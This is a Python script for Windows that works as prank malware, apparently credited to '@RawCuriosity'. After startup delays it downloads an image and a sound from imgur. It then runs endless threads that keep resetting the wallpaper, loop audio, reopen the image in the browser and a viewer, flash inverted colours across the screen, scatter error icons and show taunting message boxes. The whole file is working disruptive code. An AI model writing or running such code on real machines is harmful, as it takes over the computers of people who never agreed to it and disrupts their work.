__requires__= 'playsound==1.2.2'
from win32api import *
from win32gui import *
from win32ui import *
from win32file import *
from win32con import *
from ctypes import windll
from playsound import playsound
from pydub import AudioSegment
import requests
import threading
import random
import time
import os
from PIL import Image

username = os.getlogin()

def change_background():
    image = requests.get('https://i.imgur.com/nJz6RFe.png').content
    
    with open("C:\\Users\\" + username + "\\Documents\\nJz6RFe.png", "wb") as f:
        f.write(image)
    
    while True:
        time.sleep(5)
        windll.user32.SystemParametersInfoW(20, 0, "C:\\Users\\" + username + "\\Documents\\nJz6RFe.png", 0)

def play_whistle():
    sound = requests.get('https://i.imgur.com/GwPwTmW.mp4').content
    
    with open("C:\\Users\\" + username + "\\Documents\\GwPwTmW.mp4", "wb") as f:
        f.write(sound)
    
    sound_a = AudioSegment.from_file("C:\\Users\\" + username + "\\Documents\\GwPwTmW.mp4", format="mp4")
    sound_a.export("C:\\Users\\" + username + "\\Documents\\GwPwTmW.wav", format="wav")
    
    while True:
        playsound("C:\\Users\\" + username + "\\Documents\\GwPwTmW.wav")

def open_site():
    while True:
        os.system("start https://i.imgur.com/nJz6RFe.png")
        time.sleep(7.5)

def open_image():
    image = requests.get('https://i.imgur.com/nJz6RFe.png').content
    with open("C:\\Users\\" + username + "\\Documents\\nJz6RFe.png", "wb") as f:
        f.write(image)

    while True:
        im = Image.open("C:\\Users\\" + username + "\\Documents\\nJz6RFe.png")
        im.show()
        time.sleep(5)

def blink_screen():
    HDC = GetDC(0)
    sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
    while True:
        time.sleep(1.5)
        PatBlt(HDC, 0,0,sw,sh, PATINVERT)

def draw_errors():
    HDC = GetDC(0)
    sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
    while True:
        time.sleep(0.75)
        DrawIcon(HDC, random.randrange(sw), random.randrange(sh), LoadIcon(None, 32515)) 

def choose_popup():
    while True:
        n = random.randint(0,2)

        if n == 0:
            a()
        elif n == 1:
            b()
        elif n == 2:
            c()
        
        time.sleep(2.5)

def a():
    MessageBox("Developed by @RawCuriosity <3", ":)", MB_OK | MB_ICONINFORMATION)

def b():
    MessageBox("Josh Hutcherson", "Josh", MB_YESNOCANCEL | MB_ICONERROR)

def c():
    MessageBox("still using this coumputer?", "lol", MB_OK | MB_ICONWARNING)

blink_screen_t = threading.Thread(target=blink_screen, args=[])
change_background_t = threading.Thread(target=change_background, args=[])
play_whistle_t = threading.Thread(target=play_whistle, args=[])
choose_popup_t = threading.Thread(target=choose_popup, args=[])
open_site_t = threading.Thread(target=open_site, args=[])
draw_errors_t = threading.Thread(target=draw_errors, args=[])
open_image_t = threading.Thread(target=open_image, args=[])

def main():
    time.sleep(5)
    choose_popup_t.start()
    time.sleep(10)
    blink_screen_t.start()
    time.sleep(2.5)
    draw_errors_t.start()
    time.sleep(5)
    change_background_t.start()
    play_whistle_t.start()
    time.sleep(2.5)
    open_site_t.start()
    open_image_t.start()
    
if __name__ == "__main__":
    main()